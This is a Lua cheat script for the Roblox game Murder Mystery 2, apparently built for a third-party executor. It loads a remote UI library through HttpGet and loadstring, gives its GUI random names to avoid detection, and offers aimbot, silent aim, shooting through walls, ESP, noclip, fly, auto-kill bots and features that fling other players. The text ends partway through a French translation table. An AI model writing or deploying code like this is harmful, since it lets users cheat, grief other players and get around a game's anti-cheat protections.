local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Lighting         = game:GetService("Lighting")
local TeleportService  = game:GetService("TeleportService")
local HttpService      = game:GetService("HttpService")
local RS               = game:GetService("ReplicatedStorage")
local TweenService     = game:GetService("TweenService")
local VirtualUser      = game:FindService("VirtualUser")
local GuiService       = game:GetService("GuiService")

local LocalPlayer = Players.LocalPlayer
local Camera      = workspace.CurrentCamera

local rndSeed = Random.new(tick() * 1e6 % 2147483647)
local function rnd(len)
	local pool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	local out = {}
	for i = 1, (len or rndSeed:NextInteger(9, 15)) do
		local j = rndSeed:NextInteger(1, #pool)
		out[i] = pool:sub(j, j)
	end
	return table.concat(out)
end
local function protect(inst)
	pcall(function()
		if typeof(syn) == "table" and syn.protect_gui then syn.protect_gui(inst)
		elseif typeof(protectgui) == "function" then protectgui(inst) end
	end)
end

local mountTarget
do
	local function try(f) local ok,v=pcall(f); if ok and typeof(v)=="Instance" then return v end end
	mountTarget = (typeof(gethui)=="function" and try(gethui))
		or try(function()
			local c=game:GetService("CoreGui")
			local probe=Instance.new("Folder"); probe.Parent=c; probe:Destroy()
			return c
		end)
		or try(function() return LocalPlayer:FindFirstChildOfClass("PlayerGui") end)
		or LocalPlayer:WaitForChild("PlayerGui",10)
end
local GENV = (typeof(getgenv) == "function") and getgenv() or nil

pcall(function() if GENV and GENV.NOKia_Unload then GENV.NOKia_Unload() end end)
pcall(function()
	if GENV and type(GENV.NOKia_GUIS) == "table" then
		for _, g in ipairs(GENV.NOKia_GUIS) do pcall(function() g:Destroy() end) end
	end
end)
for _, g in ipairs(mountTarget:GetChildren()) do
	if g.Name == "Obsidian" or g.Name == "NOKia_ESP" or g.Name == "NOKia_MINI" or g.Name == "NOKia_HUD" or g.Name == "NOKia_GUI_EDITOR" then pcall(function() g:Destroy() end) end
end
local TRACKED = {}
if GENV then GENV.NOKia_GUIS = TRACKED end
local function trackGui(inst) table.insert(TRACKED, inst); protect(inst); return inst end

local repo="https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
local srcs={}
do
	local paths={"Library.lua","addons/ThemeManager.lua","addons/SaveManager.lua"}
	local cachePaths={"NOKia_MM2/ui_cache/Library.lua","NOKia_MM2/ui_cache/ThemeManager.lua","NOKia_MM2/ui_cache/SaveManager.lua"}
	pcall(function()
		if typeof(isfolder)=="function" and typeof(makefolder)=="function" then
			if not isfolder("NOKia_MM2") then makefolder("NOKia_MM2") end
			if not isfolder("NOKia_MM2/ui_cache") then makefolder("NOKia_MM2/ui_cache") end
		end
	end)
	for i,cachePath in ipairs(cachePaths) do
		pcall(function() if typeof(isfile)=="function" and typeof(readfile)=="function" and isfile(cachePath) then srcs[i]=readfile(cachePath) end end)
	end
	local left=0
	for i,p in ipairs(paths) do
		if not srcs[i] then
			left+=1
			task.spawn(function()
				local ok,res=pcall(function() return game:HttpGet(repo..p) end)
				if ok and type(res)=="string" and #res>100 then
					srcs[i]=res
					pcall(function() if typeof(writefile)=="function" then writefile(cachePaths[i],res) end end)
				end
				left-=1
			end)
		end
	end
	local t0=os.clock()
	while left>0 and os.clock()-t0<8 do task.wait() end
	for i,p in ipairs(paths) do
		if not srcs[i] then return error("[NOKia] Impossible de charger "..p.." après 8 secondes. Relance le script.",0) end
	end
end
if typeof(loadstring)~="function" then
	return error("[NOKia] Your executor has no loadstring, which the UI library needs.",0)
end
local Library=loadstring(srcs[1])()
local ThemeManager=loadstring(srcs[2])()
local SaveManager=loadstring(srcs[3])()
local Options=Library.Options
local Toggles=Library.Toggles

local function create(class,props,children)
	local o=Instance.new(class)
	for k,v in pairs(props or {}) do o[k]=v end
	for _,c in ipairs(children or {}) do c.Parent=o end
	return o
end
local function hideWindow()
	pcall(function()
		if Library.ScreenGui then Library.ScreenGui.Name = rnd(); trackGui(Library.ScreenGui) end
	end)
end

local flags={autoKill=false,autoFlingMurderer=false,autoFlingSheriff=false,knifeWalls=false,gunWalls=false,instantKnife=false,gunEsp=false,gunEspDist=false,autoGun=false,aimbot=false,silentAim=false,showFov=false,
	fly=false,flySpeed=60,noclip=false,infJump=false,unlockCam=false,
	espBox=false,espChams=false,espFill=false,espNames=false,espRoleTags=false,espSkeleton=false,killFeed=false,coinEsp=false,autoCoins=false,coinPath=true,autoCoinAvoidWalls=false,coinTeleportWhenStuck=false,coinTeleportWhenDanger=false,murdererSheriffBot=false,sheriffMurdererBot=false,killRemainingAfterSheriff=false,coinBagBeforeRoleBot=false,coinLimitBeforeRoleBot=false,
	fullbright=false,fpsBoost=false,murdererNotify=false,antiAfk=false,
	miniSquare=true,showBindNote=false,touchPad=false,flingPower=90000,flingSeconds=1.2,trapEsp=false,antiTrap=false,antiFling=false,pauseAntiFlingDuringFling=true,autoFlingSelected=false,ultraFling=false,nokiaNetwork=false,autoMistralChat=false,mistralReplyAll=false,uiStyle="Classic",guiHud=true,guiEditMode=false,radar2D=false,radarRoomBackground=false,radar3D=false,radarPlayers=true,radarMurderer=true,radarSheriff=true,radarCoins=true,radarGun=true,spectate=false}
local COLLECT_SPEED=16
local autoCoinSpeed=16
local aimFov=120
local flinging=false
local murdererSheriffBusy=false
local sheriffMurdererBusy=false
local coinBagFull=false
local collectedCoinCount=0
local roleBotCoinLimit=40
local NOKia={
	tpAt=-10, TP_GRACE=2.5,
	FLING_POWER=99999, FLING_SECONDS=2.5,
	COIN_MAX_DIST=800,
	plrs={},
	unclip=setmetatable({},{__mode="k"}),
	mobUp=false, mobDown=false, mobAim=false,
	camThru=nil,
	FLING_STEP=3,
	tagOwners={},
	guiN=0, guiT=0,
}
NOKia.PathfindingService=game:GetService("PathfindingService")
NOKia.coinPlan={}
function NOKia.teleporting() return os.clock()-NOKia.tpAt<NOKia.TP_GRACE end
function NOKia.markTeleport() NOKia.tpAt=os.clock() end
NOKia.addKeyTrash=function(keyName,rowText,isButton)
	task.defer(function()
		local keyPicker=Options[keyName]
		local screen=Library.ScreenGui
		if not (screen and keyPicker) then return end
		local host
		for _,node in ipairs(screen:GetDescendants()) do
			if isButton and node:IsA("TextButton") and node.Text==rowText then
				local parent=node.Parent
				if parent and parent:FindFirstChildOfClass("UIListLayout") then host=parent; break end
			elseif not isButton and node:IsA("TextLabel") and node.Text==rowText then
				host=node
				if node:FindFirstChildOfClass("UIListLayout") then break end
			end
		end
		if not host or host:FindFirstChild("NOKiaKeyTrash_"..keyName) then return end
		local trash=create("TextButton",{Name="NOKiaKeyTrash_"..keyName,Size=UDim2.fromOffset(20,20),BackgroundColor3=Color3.fromRGB(94,48,56),AutoButtonColor=false,
			Text="🗑",Font=Enum.Font.GothamBold,TextSize=11,TextColor3=Color3.fromRGB(255,235,238),Parent=host},
			{create("UICorner",{CornerRadius=UDim.new(0,5)}),create("UIStroke",{Color=Color3.fromRGB(255,120,130),Transparency=.35})})
		trash.MouseButton1Click:Connect(function()
			keyPicker:SetValue({"None",keyPicker.Mode or (isButton and "Press" or "Toggle"),{}})
		end)
	end)
end
local instantFiredAt=-10
local unstick
local MiniBtnRef
local conns={}
local function bind(sig,fn) local c=sig:Connect(fn);table.insert(conns,c);return c end
local function notify(msg,t) Library:Notify({Title="NOKia",Description=msg,Time=t or 3}) end
local function mousePos()
	local m=UserInputService:GetMouseLocation(); local ins=GuiService:GetGuiInset()
	return Vector2.new(m.X-ins.X, m.Y-ins.Y)
end

local MM2_PLACE=142823291
local MM2_UNIVERSE=66654135
local CONFIG_FOLDER="NOKia_MM2"
local AUTO_SAVE_CONFIG="NOKia_AutoSave"
local hopFallbackPlace
local function fetchServers(placeId,maxPages,sortOrder,deadline)
	local out,cursor={},nil
	for _=1,(maxPages or 4) do
		if deadline and os.clock()>=deadline then break end
		local order=sortOrder=="Asc" and "Asc" or "Desc"
		local url="https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder="..order.."&limit=100"
		if cursor then url=url.."&cursor="..HttpService:UrlEncode(cursor) end
		local ok,res=pcall(function() return game:HttpGet(url) end)
		if not ok then break end
		local ok2,d=pcall(function() return HttpService:JSONDecode(res) end)
		if not (ok2 and d and d.data) then break end
		for _,sv in ipairs(d.data) do out[#out+1]=sv end
		cursor=d.nextPageCursor
		if not cursor then break end
	end
	return out
end
local function hopServers(placeId,excludeJob,fallbackTeleport)
	task.spawn(function()
		local all=fetchServers(placeId,4)
		local room,any={},{}
		for _,sv in ipairs(all) do
			if sv.id and sv.id~=excludeJob then
				any[#any+1]=sv
				if (sv.playing or 0)<(sv.maxPlayers or 0) then room[#room+1]=sv end
			end
		end
		local pick
		if #room>0 then
			table.sort(room,function(a,b) return (a.playing or 0)>(b.playing or 0) end)
			pick=room[math.random(1,math.min(#room,5))]
		elseif #any>0 then
			pick=any[math.random(1,#any)]
		end
		if pick then
			hopFallbackPlace=placeId
			local ok=pcall(function() TeleportService:TeleportToPlaceInstance(placeId,pick.id,LocalPlayer) end)
			if ok then return end
		end
		hopFallbackPlace=nil
		notify("Letting Roblox pick a server...")
		pcall(function() TeleportService:Teleport(placeId,LocalPlayer) end)
	end)
end
local function rejoin() notify("Rejoining..."); pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId,LocalPlayer) end) end
local function serverHop() notify("Finding a server..."); hopServers(game.PlaceId,game.JobId,true) end
local function joinMM2() notify("Joining Murder Mystery 2..."); hopServers(MM2_PLACE,nil,true) end
local function registerNokiaThemes()
	local themes=ThemeManager.BuiltInThemes
	table.clear(themes)
	themes["NOKia Soft Midnight"]={1,{FontColor="f8fafc",MainColor="182033",AccentColor="8b9cff",BackgroundColor="0b1020",OutlineColor="2b3856",BackgroundImage=""}}
	themes["NOKia Soft Ocean"]={2,{FontColor="eefbff",MainColor="123047",AccentColor="43c5e8",BackgroundColor="081c2b",OutlineColor="24516a",BackgroundImage=""}}
	themes["NOKia Soft Rose"]={3,{FontColor="fff7fb",MainColor="382033",AccentColor="fb87bd",BackgroundColor="21121d",OutlineColor="60364f",BackgroundImage=""}}
	themes["NOKia Soft Emerald"]={4,{FontColor="f1fff8",MainColor="17362e",AccentColor="50d6a1",BackgroundColor="0b211c",OutlineColor="2b5c4d",BackgroundImage=""}}
end
registerNokiaThemes()
local function applySavedTheme()
	pcall(function() ThemeManager:SetLibrary(Library) end)
	pcall(function() ThemeManager:SetFolder(CONFIG_FOLDER) end)
	pcall(registerNokiaThemes)
	pcall(function()
		local p=CONFIG_FOLDER.."/themes/default.txt"
		if typeof(isfile)=="function" and isfile(p) then
			local name=readfile(p)
			if name and #name>0 then ThemeManager:ApplyTheme(name) end
		end
	end)
end

if game.GameId~=MM2_UNIVERSE then
	applySavedTheme()
	local W=Library:CreateWindow({Title="NOKia",Footer="MM2 · ",Center=true,AutoShow=true,ShowCustomCursor=true})
	hideWindow()
	W:AddTab("Info","alert-triangle")
		W:AddDialog("WrongGame",{
		Title="Unsupported Game",
		Description="NOKia only supports Murder Mystery 2. Click \"Join MM2\" to teleport to a Murder Mystery 2 server.",
		OutsideClickDismiss=false,
		FooterButtons={
			{Id="Join",Title="Join MM2",Variant="Primary",Callback=function() joinMM2() end},
			{Id="Close",Title="Close",Variant="Secondary",Callback=function(d) pcall(function() d:Dismiss() end); Library:Unload() end},
		},
	})
	pcall(function() if GENV then GENV.NOKia_Unload=function() pcall(function() Library:Unload() end) end end end)
	return
end

local EspGui=trackGui(create("ScreenGui",{Name=rnd(),ResetOnSpawn=false,IgnoreGuiInset=false,DisplayOrder=998,Parent=mountTarget}))
local HudGui=trackGui(create("ScreenGui",{Name="NOKia_HUD",ResetOnSpawn=false,IgnoreGuiInset=false,DisplayOrder=1000,Parent=mountTarget}))
NOKia.toastGui=trackGui(create("ScreenGui",{Name=rnd(),ResetOnSpawn=false,IgnoreGuiInset=false,DisplayOrder=1002,Parent=mountTarget}))
NOKia.toastHolder=create("Frame",{Name=rnd(),AnchorPoint=Vector2.new(.5,1),Position=UDim2.new(.5,0,1,-28),Size=UDim2.fromOffset(330,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,Parent=NOKia.toastGui},
	{create("UIListLayout",{Padding=UDim.new(0,7),VerticalAlignment=Enum.VerticalAlignment.Bottom,HorizontalAlignment=Enum.HorizontalAlignment.Center,SortOrder=Enum.SortOrder.LayoutOrder})})
NOKia.uiLanguage="English"
NOKia.frenchText={
	["Player"]="Joueur",["Visuals"]="Visuels",["Teleport"]="Téléportation",["Server"]="Serveur",["Lookup"]="Recherche",["UI Settings"]="Paramètres UI",
	["NOKia Network"]="Réseau NOKia",["Presence"]="Présence",["EXPERIMENTAL / DANGER — NOKia Visibility & Chat"]="EXPÉRIMENTAL / DANGER — Visibilité et chat NOKia",["NOKia Chat"]="Chat Nokia",["Send NOKia Message"]="Envoyer le message Nokia",["Online NOKia Users"]="Utilisateurs Nokia en ligne",
	["Nokia Connected Services"]="Services connectés Nokia",["Enable Nokia Online Services"]="Activer Nokia Online Services",["Direct connection to the Nokia Online server. No message or marker uses Roblox chat."]="Connexion directe au serveur Nokia Online. Aucun message ni marqueur ne passe par le chat Roblox.",
	["Server: 212.83.145.217:8765"]="Serveur : 212.83.145.217:8765",["Status: disabled"]="État : désactivé",["Region: FR • Ping: -- ms"]="Région : FR • Ping : -- ms",["Nokia users connected: 0 (all servers)"]="Utilisateurs Nokia connectés : 0 (tous serveurs)",
	["Badges and chat use only the Nokia server, never Roblox chat."]="Les badges et le chat utilisent uniquement le serveur Nokia, jamais le chat Roblox.",["This setting can be saved to reconnect on the next launch."]="Le réglage peut être sauvegardé pour se reconnecter au prochain lancement.",
	["Show privacy notice again"]="Afficher à nouveau l'avis de confidentialité",["Re-enables the local privacy confirmation for the next activation."]="Réactive la confirmation de confidentialité locale pour la prochaine activation.",
	["Server"]="Serveur",["World"]="Monde",["Join"]="Rejoindre",["Your message..."]="Votre message...",["Send"]="Envoyer",["New private conversation"]="Nouvelle discussion privée",["Online Nokia username..."]="Pseudo Nokia en ligne...",["Search"]="Chercher",["Searches currently connected Nokia users."]="Recherche les utilisateurs Nokia actuellement connectés.",["Accept"]="Accepter",["Decline"]="Refuser",["NOKIA FOUNDER"]="FONDATEUR NOKIA",
	["Chat"]="Chat",["Mistral Auto Chat"]="Chat automatique Mistral",["Mistral API Key"]="Clé API Mistral",["Show / Hide Mistral API Key"]="Afficher / masquer la clé API Mistral",["Chat Personality"]="Personnalité du chat",["Sarcastic"]="Sarcastique",["Light sarcasm"]="Ironie légère",["Reply When Mentioned"]="Répondre lors d'une mention",["EXPERIMENTAL — Reply To Every Message"]="EXPÉRIMENTAL — Répondre à tous les messages",["Mistral Model"]="Modèle Mistral",
	["Keeps the last four exchanges separately for each player, only while this script is running."]="Conserve les quatre derniers échanges séparément pour chaque joueur, seulement pendant cette session.",
	["Queues every player message for Mistral. This can spend API credits quickly and may hit Roblox chat rate limits."]="Met chaque message joueur en file pour Mistral. Cela peut utiliser rapidement tes crédits API et atteindre les limites du chat Roblox.",
	["Replies in public Roblox chat only when a player writes NOKia or @NOKia. The API key is kept only in memory and is never saved."]="Répond dans le chat public Roblox seulement lorsqu'un joueur écrit NOKia ou @NOKia. La clé API est gardée uniquement en mémoire et n'est jamais sauvegardée.",
	["Your key and the triggering chat message are sent to Mistral's API. Use a limited key and never share it."]="Ta clé et le message qui déclenche la réponse sont envoyés à l'API Mistral. Utilise une clé limitée et ne la partage jamais.",
	["The API key is saved locally in plain text in your NOKia config. Do not share that config file."]="La clé API est sauvegardée localement en clair dans ta configuration NOKia. Ne partage pas ce fichier.",
	["DANGER: presence markers use Roblox public chat. This option is never enabled automatically and must be activated again after every launch."]="DANGER : les marqueurs de présence utilisent le chat public Roblox. Cette option n'est jamais activée automatiquement et doit être réactivée après chaque lancement.",
	["When enabled, sends a small presence marker through Roblox chat so compatible NOKia users can identify you. Turning it off stops all outgoing NOKia presence and chat traffic."]="Quand cette option est activée, envoie un petit marqueur de présence via le chat Roblox afin que les utilisateurs NOKia compatibles puissent t'identifier. La désactiver arrête tout envoi de présence et de chat NOKia.",
	["Uses Roblox chat and therefore remains filtered and subject to Roblox limits."]="Utilise le chat Roblox : les messages restent filtrés et soumis aux limites de Roblox.",
	["Disabling visibility sends nothing. Existing badges expire automatically."]="Désactiver la visibilité n'envoie rien. Les badges existants expirent automatiquement.",
	["Combat"]="Combat",["Bot"]="Bot",["GUI"]="Interface",["Safety"]="Sécurité",["Tools"]="Outils",["Movement"]="Mouvement",["Stats"]="Statistiques",
	["Spectator"]="Spectateur",["Player To Follow"]="Joueur à suivre",["Follow Selected Player"]="Suivre le joueur sélectionné",["Stop Spectating"]="Arrêter de regarder",["2D Radar"]="Radar 2D",["Show Local Radar"]="Afficher le radar local",["Show Local Room Background"]="Afficher le plan local",["Show 3D Radar"]="Afficher le radar 3D",["Show Innocent Players"]="Afficher les innocents",["Show Murderer"]="Afficher le meurtrier",["Show Sheriff / Hero"]="Afficher le shérif / héros",["Show Coins"]="Afficher les pièces",["Show Dropped Gun"]="Afficher le pistolet au sol",["Radar Range"]="Portée du radar",["Performance"]="Performances",["Radar is local: only you can see it."]="Le radar est local : toi seul peux le voir.",
	["Safety Mode"]="Mode sécurité",["Safety Mode Key"]="Touche mode sécurité",["Immediately stops fly, noclip, coin bots, role bots, fling and automated teleports."]="Arrête immédiatement le vol, noclip, les bots de pièces et de rôles, les éjections et téléportations automatiques.",
	["Coin Bot"]="Bot de pièces",["Role Bots"]="Bots de rôles",["Start Requirement"]="Condition de départ",["Server Finder"]="Recherche de serveur",["This Server"]="Ce serveur",["Actions"]="Actions",
	["Auto Collect Coins"]="Ramassage automatique des pièces",["Avoid Walls"]="Éviter les murs",["Show Coin Route"]="Afficher le chemin des pièces",["Auto Kill Sheriff"]="Tuer automatiquement le shérif",["Auto Kill Murderer"]="Tuer automatiquement le meurtrier",
	["EXPERIMENTAL — Collect All Map Coins"]="EXPÉRIMENTAL — Ramasser toutes les pièces de la carte",["Teleports through the coins currently on the map in up to 1.5 seconds, skips any coin taken in the meantime, then returns you to your starting position."]="Se téléporte vers les pièces actuellement présentes en jusqu'à 1,5 seconde, ignore celles récupérées entre-temps, puis te ramène à ta position de départ.",["Collect All Map Coins Key"]="Touche : ramasser toutes les pièces",["A collection is already in progress."]="Une collecte est déjà en cours.",["No available coins on this map."]="Aucune pièce disponible sur cette carte.",
	["One-Shot Role Attack"]="Attaque unique par rôle",["One-Shot Role Attack Key"]="Touche d'attaque unique",["Uses your current role: as sheriff or hero, shoots the murderer once; as murderer, attacks the sheriff or hero once. It never repeats automatically."]="Utilise ton rôle actuel : en shérif ou héros, tire une fois sur le meurtrier ; en meurtrier, attaque une fois le shérif ou héros. Ne se répète jamais automatiquement.",
	["Kill Everyone Except Sheriff"]="Tuer tous sauf le shérif",["Kill Everyone Except Sheriff Key"]="Touche : tuer sauf shérif",["As murderer, attacks every alive player once except the sheriff or hero. This is a one-off action, not a loop."]="En meurtrier, attaque une fois chaque joueur vivant sauf le shérif ou le héros. C'est une action unique, pas une boucle.",
	["Smart Walking Mode"]="Mode marche intelligente",["Uses Roblox pathfinding to walk around walls, jump over obstacles, recover when stuck, and avoid the murderer."]="Utilise le calcul de chemin Roblox pour contourner les murs, sauter les obstacles, se débloquer et éviter le meurtrier.",
	["Teleport If Completely Stuck"]="Téléporter si complètement bloqué",["After several failed jumps and detours, teleports directly to the target coin."]="Après plusieurs sauts et détours ratés, se téléporte directement à la pièce ciblée.",
	["Teleports after repeated failed escapes or when the smart 5-to-10-second travel limit expires."]="Se téléporte après plusieurs tentatives de déblocage ratées ou lorsque la limite intelligente de 5 à 10 secondes est dépassée.",
	["A reachable coin gets 5 to 10 seconds based on its real walking distance; otherwise it is skipped."]="Une pièce atteignable dispose de 5 à 10 secondes selon la distance réelle à pied ; sinon elle est ignorée.",
	["Emergency Teleport From Murderer"]="Téléportation d'urgence face au meurtrier",["When the murderer is extremely close, teleports directly to the planned coin."]="Lorsque le meurtrier est extrêmement proche, se téléporte directement à la pièce prévue.",
	["Triggers early when the murderer closes in, then teleports to the coin farthest from them."]="Se déclenche tôt lorsque le meurtrier approche, puis se téléporte vers la pièce la plus éloignée de lui.",
	["Enable Smart Walking Mode first."]="Active d'abord le mode marche intelligente.",
	["Show 10-Coin Route"]="Afficher le trajet de 10 pièces",["Shows the complete plan from you through the next 10 coins. It recalculates when a coin is taken or danger changes."]="Affiche le trajet complet jusqu'aux 10 prochaines pièces. Il est recalculé si une pièce est prise ou si le danger change.",
	["Yellow is the next coin; blue lines show the rest of the planned route."]="Le jaune indique la prochaine pièce ; les lignes bleues montrent la suite du trajet.",
	["Kill Remaining Players"]="Tuer les joueurs restants",["Fly"]="Vol",["Noclip"]="Noclip",["Infinite Jump"]="Saut infini",["Walk Speed"]="Vitesse de marche",["Jump Power"]="Puissance de saut",
	["Minimum Players"]="Joueurs minimum",["Maximum Players"]="Joueurs maximum",["Between: minimum players"]="Entre : joueurs minimum",["Between: maximum players"]="Entre : joueurs maximum",["Only servers with a free slot"]="Serveurs avec une place libre",
	["Servers found"]="Serveurs trouvés",["Find Servers"]="Trouver des serveurs",["Join Selected"]="Rejoindre la sélection",["Find and Join"]="Trouver et rejoindre",["Rejoin"]="Rejoindre à nouveau",["Server Hop"]="Changer de serveur",
	["Theme"]="Thème",["Accent colour"]="Couleur d'accent",["Interface Style"]="Style d'interface",["Language"]="Langue",["Configs"]="Configurations",["Save"]="Sauvegarder",["Load"]="Charger",["Delete"]="Supprimer",["Unload"]="Fermer",
	["Touch Controls"]="Contrôles tactiles",["Minimize To Square"]="Réduire en carré",["Show Menu Bind Note"]="Afficher le raccourci du menu",["Menu bind"]="Touche du menu",
	["Murderer"]="Meurtrier",["Sheriff"]="Shérif",["Murderer + Sheriff"]="Meurtrier + shérif",["Knife Through Walls"]="Couteau à travers les murs",["Instant Knife Throw"]="Lancer de couteau instantané",
	["Knife Silent Aim"]="Visée silencieuse du couteau",["Aim FOV"]="Champ de vision de visée",["Show FOV Circle"]="Afficher le cercle de visée",["Gun Through Walls"]="Pistolet à travers les murs",["Dropped Gun ESP"]="ESP pistolet au sol",
	["Gun ESP Distance"]="Distance ESP du pistolet",["Grab Gun Now"]="Prendre le pistolet",["Fly Speed"]="Vitesse de vol",["Unlock Camera"]="Déverrouiller la caméra",["Reset Character"]="Réinitialiser le personnage",
	["Movement Keybinds"]="Touches de mouvement",["Clear Fly Key"]="Supprimer la touche de vol",["Clear Noclip Key"]="Supprimer la touche Noclip",["Route"]="Itinéraire",["Collect Speed"]="Vitesse de collecte",
	["Auto Collect Until Bag Full"]="Collecter jusqu'au sac plein",["Use Specific Coin Limit"]="Utiliser une limite de pièces",["Coins Before Auto Kill"]="Pièces avant l'auto kill",
	["HUD Editor"]="Éditeur HUD",["Show Custom HUD"]="Afficher le HUD personnalisé",["Edit Mode"]="Mode édition",["Widget Text"]="Texte du widget",["Add Text Widget"]="Ajouter un widget texte",
	["Clear Text Widgets"]="Effacer les widgets texte",["Useful Widgets"]="Widgets utiles",["Add Role Widget"]="Ajouter le widget rôle",["Add Coin Widget"]="Ajouter le widget pièces",["Add Coin Bag Widget"]="Ajouter le widget sac de pièces",
	["Add Bot Target Widget"]="Ajouter le widget cible du bot",["Add Clock Widget"]="Ajouter le widget horloge",["Add Server Widget"]="Ajouter le widget serveur",["Add Ping Widget"]="Ajouter le widget ping",["Add Nokia Online Widget"]="Ajouter le widget Nokia Online",
	["Add Auto Kill Widget"]="Ajouter le widget auto kill",["Add Health Widget"]="Ajouter le widget santé",["Add Position Widget"]="Ajouter le widget position",["Add Weapon Widget"]="Ajouter le widget arme",
	["Add Round Status Widget"]="Ajouter le widget statut de manche",["Add FOV Widget"]="Ajouter le widget FOV",["Player ESP"]="ESP joueurs",["Nametag ESP"]="ESP des noms",["Box ESP"]="ESP encadré",
	["Chams Fill"]="Remplissage Chams",["Role Tags"]="Étiquettes de rôle",["Skeleton ESP"]="ESP squelette",["World & Render"]="Monde et rendu",["Trap ESP"]="ESP pièges",
	["Kill Feed"]="Journal des éliminations",["Field of View"]="Champ de vision",["Player Actions"]="Actions joueur",["Select Player"]="Sélectionner un joueur",["Teleport To Player"]="Se téléporter au joueur",
	["Fling Player"]="Éjecter le joueur",["Fling All Players"]="Éjecter tous les joueurs",["Auto Fling Murderer"]="Éjecter automatiquement le meurtrier",["Auto Fling Sheriff"]="Éjecter automatiquement le shérif",["Auto Fling Selected Player"]="Éjecter automatiquement le joueur sélectionné",
	["Ultra Fling — EXPERIMENTAL"]="Ultra éjection — EXPÉRIMENTAL",["Uses the dedicated high-velocity contact method from flingscript.lua. Normal Fling keeps its original method."]="Utilise la méthode dédiée de contact à haute vitesse de flingscript.lua. L'éjection normale conserve sa méthode d'origine.",
	["Continuously flings the player selected above."]="Éjecte continuellement le joueur sélectionné ci-dessus.",["Select a player first."]="Sélectionne d'abord un joueur.",
	["Role Fling Keybinds"]="Touches d'éjection par rôle",["Fling Sheriff / Hero"]="Éjecter le shérif / héros",["Fling Murderer"]="Éjecter le meurtrier",
	["Press the assigned key once to fling that role. The same key may be used elsewhere."]="Appuie une fois sur la touche attribuée pour éjecter ce rôle. La même touche peut être utilisée ailleurs.",
	["Fling the sheriff or hero once. Assign a key in the small box beside this button."]="Éjecte une fois le shérif ou le héros. Attribue une touche dans la petite case à côté du bouton.",
	["Fling the current murderer once. Assign a key in the small box beside this button."]="Éjecte une fois le meurtrier actuel. Attribue une touche dans la petite case à côté du bouton.",
	["Player Lookup"]="Recherche de joueur",["Look Up Player"]="Rechercher le joueur",["View Full Inventory"]="Voir l'inventaire complet",["Copy Results"]="Copier les résultats",
	["Anti Fling"]="Anti-éjection",["Pause Anti Fling During Fling"]="Suspendre l'anti-éjection pendant une éjection",["Temporarily pauses Anti Fling immediately before one of your own fling actions, then restores it automatically."]="Suspend temporairement l'anti-éjection juste avant l'une de tes propres éjections, puis la réactive automatiquement.",["Anti Trap"]="Anti-piège",["Awareness"]="Alertes",["Murderer Notify"]="Alerte meurtrier",["Server Type"]="Type de serveur",
	["Copy Job ID"]="Copier l'identifiant du serveur",["Only servers with a free slot"]="Seulement les serveurs avec une place",["Press Find Servers"]="Appuie sur Trouver des serveurs",["Search timed out - try again"]="Recherche expirée - réessaie",
	["Classic"]="Classique",["Applied and saved automatically."]="Appliqué et sauvegardé automatiquement.",["French translates the main menu labels. Your setting is saved automatically."]="Le français traduit les libellés du menu. Le choix est sauvegardé automatiquement.",
	["Your thrown knives ignore geometry. Aim at a player or anywhere on the map. Does not throw for you."]="Tes couteaux traversent les murs. Vise un joueur ou un endroit sur la carte : cela ne lance pas le couteau automatiquement.",
	["Skips the wind up and the flight time, so the knife lands the instant you press throw. Walls still block it unless Knife Through Walls is on."]="Supprime le délai et le temps de vol : le couteau arrive instantanément. Les murs le bloquent sauf avec Couteau à travers les murs.",
	["Hold the keybind to snap your camera to the closest enemy in your FOV."]="Maintiens la touche pour viser automatiquement l'ennemi le plus proche dans ton champ de vision.",
	["Radius in pixels around your cursor that counts as a valid target."]="Rayon, en pixels, autour du curseur dans lequel une cible est valide.",
	["Draws the aim radius. Only visible while an aim feature is on."]="Affiche le rayon de visée. Visible seulement lorsqu'une fonction de visée est activée.",
	["Highlights the sheriff gun once it is lying on the ground."]="Met en évidence le pistolet du shérif une fois au sol.",["Adds a distance label to the dropped gun highlight."]="Ajoute la distance à l'indicateur du pistolet au sol.",
	["Grabs the dropped gun the moment it appears, then returns you."]="Prend le pistolet au sol dès qu'il apparaît, puis te ramène à ta position.",["One-off grab of the dropped gun"]="Prend une fois le pistolet au sol.",
	["WASD to move, Space up, Ctrl down. Relative to your camera."]="ZQSD/WASD pour bouger, Espace pour monter, Ctrl pour descendre. Relatif à la caméra.",["Studs per second while flying."]="Studs parcourus par seconde pendant le vol.",
	["Walk through walls. Forced on during a fling, which needs it."]="Traverse les murs. Activé automatiquement pendant une éjection.",["Jump again any time, including mid-air."]="Permet de sauter à nouveau à tout moment, même en l'air.",
	["Removes the zoom limit. Combined with Noclip the camera also passes through walls."]="Retire la limite de zoom. Avec Noclip, la caméra traverse aussi les murs.",["Kills you so you respawn"]="Te réinitialise afin de réapparaître.",
	["Moves to the nearest available coin. If another player takes it, the bot immediately chooses a different coin."]="Va vers la pièce disponible la plus proche. Si un autre joueur la prend, le bot en choisit immédiatement une autre.",
	["Uses normal collision instead of noclip. Coins behind walls are skipped if the bot cannot reach them."]="Utilise les collisions normales au lieu du noclip. Les pièces inaccessibles derrière un mur sont ignorées.",
	["Movement speed used only while the coin bot is active."]="Vitesse utilisée uniquement lorsque le bot de pièces est actif.",["Draws a yellow line from you to the coin currently targeted by the bot."]="Dessine une ligne jaune vers la pièce ciblée par le bot.",
	["As murderer, teleports in front of the sheriff with noclip, attacks once, then returns to your saved position."]="En meurtrier, se téléporte devant le shérif avec noclip, attaque une fois, puis revient à ta position.",
	["After the sheriff or hero is eliminated, Auto Kill Sheriff continues with every remaining alive player."]="Après l'élimination du shérif ou du héros, Auto Kill Shérif continue sur tous les joueurs encore vivants.",
	["As sheriff, equips the gun, teleports near the murderer with noclip, fires once, then returns to your saved position."]="En shérif, équipe le pistolet, se téléporte près du meurtrier avec noclip, tire une fois puis revient à ta position.",
	["Collects coins automatically, then starts the selected Auto Kill bot when the coin bag is full."]="Collecte les pièces automatiquement puis démarre le bot Auto Kill choisi lorsque le sac est plein.",
	["Enable Auto Kill Sheriff or Auto Kill Murderer first."]="Active d'abord Auto Kill Shérif ou Auto Kill Meurtrier.",["Uses the coin limit below instead of waiting for the bag to be full."]="Utilise la limite de pièces ci-dessous au lieu d'attendre que le sac soit plein.",
